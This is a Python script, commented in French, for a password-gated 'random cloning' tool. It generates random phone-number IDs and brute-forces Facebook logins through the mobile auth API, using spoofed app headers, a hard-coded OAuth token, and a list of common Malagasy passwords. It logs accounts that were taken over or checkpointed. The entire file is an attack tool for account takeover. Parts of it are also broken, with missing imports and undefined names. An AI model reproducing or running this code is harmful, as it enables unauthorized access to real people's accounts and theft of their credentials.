import os
import random
import string
import uuid
import subprocess
import asyncio
import getpass
import logging
import requests

from concurrent.futures import ThreadPoolExecutor as tred

logging.basicConfig(filename='hfhax.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Mot de passe pour déverrouiller le script
mot_de_passe = "HMHAX808"

async def check_password():
    saisie_mot_de_passe = getpass.getpass("INSÉREZ LE MOT DE PASSE : ")
    if saisie_mot_de_passe != mot_de_passe:
        print("MOT DE PASSE INCORRECT❌. Arrêt.")
        logging.warning("Mot de passe incorrect. Arrêt du script.")
        exit()
    else:
        print("MOT DE PASSE CORRECT✅. Lancement ...")
        logging.info("Mot de passe correct. Lancement du script.")
        try:
            subprocess.run(["git", "pull"], check=True)
            print("Git pull terminé avec succès !")
            logging.info("Git pull terminé avec succès !")
        except subprocess.CalledProcessError as e:
            print(f"Erreur lors de l'exécution de git pull : {e}")
            logging.error(f"Erreur lors de l'exécution de git pull : {e}")
            exit(1)

async def BD_CLONING(code, limit):
    user = [''.join(random.choices(string.digits, k=9)) for _ in range(limit)]
    async with tred(max_workers=60) as Dipto:
        async with aiohttp.ClientSession() as session:
            tasks = [method_crack(session, code + psx) for psx in user]
            results = await asyncio.gather(*tasks)
            oks = [result[0] for result in results if result[1] == 'OK']
            cps = [result[0] for result in results if result[1] == 'CP']
            print(f'CLONAGE TERMINÉ.\nTOTAL ID OK : {len(oks)}\nTOTAL ID CP : {len(cps)}')

async def method_crack(session, ids):
    for pas in generate_passwords(ids):
        adid = str(uuid.uuid4())
        device_id = str(uuid.uuid4())
        data = {'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
        header = {'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
        url = 'https://api.facebook.com/method/auth.login'
        try:
            response = await fetch(session, url, data, header)
            if 'session_key' in response:
                try:
                    uid = response['uid']
                except:
                    uid = ids
                logging.info(f"Identifiant OK : {uid}")
                return uid, 'OK'
            elif 'www.facebook.com' in response['error_msg']:
                logging.info(f"Identifiant CP : {ids}")
                return ids, 'CP'
        except Exception as e:
            logging.error(f"Erreur lors de la tentative de connexion : {e}")

async def fetch(session, url, data, header):
    async with session.post(url, data=data, headers=header) as response:
        return await response.json()

def generate_passwords(ids):
    common_passwords = ['1234567', 'malala', 'Anjara', 'anjara', 'Antananarivo', 'Malagasy', 'Judio99', 'Angelina', 'Malala', 'fitiavana', 'mamako', 'Baby1234', 'babyko', 'Urus1234', 'ferari', '12345678', 'Business123', 'Zandriko', 'Papako', 'Zoroluffy', 'Onepiece', 'Ceasar123', 'Rimka', 'Lune123', '200509', 'Love123', 'Mylova', 'Lover1234', 'Freefire123', 'Freefire', 'freefire', 'freefire123', '200609', '200409', '200309', '200209', '202403', 'razana', 'Razana', '200109', '200009', 'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika', 'mendrikarivo', 'mendrikarivo', 'antananarivo', 'antananarivo', 'marary', 'marary', 'milely', 'milely', 'Fitiavana', 'vadiko', 'Vadiko,', 'jesosy', 'Jesosy', 'mahery,', 'Mahery', 'malagasy', 'Malagasy']
    return [ids] + [ids[:i] for i in range(1, 8)] + common_passwords

async def main():
    await check_password()
    print(logo)
    await HMHAX()

async def HMHAX():
    options = {'01': BD_CLONING, '00': exit}
    while True:
        print_menu()
        option = input('CHOISISSEZ UNE OPTION : ')
        if option in options:
            await options[option]()
        else:
            print('Option invalide. Veuillez réessayer.')

def print_menu():
    print(f'{B} [{warna}01{B}] MG RANDOM CLONING ')
    print(f'{B} [{warna}00{B}] EXIT ')

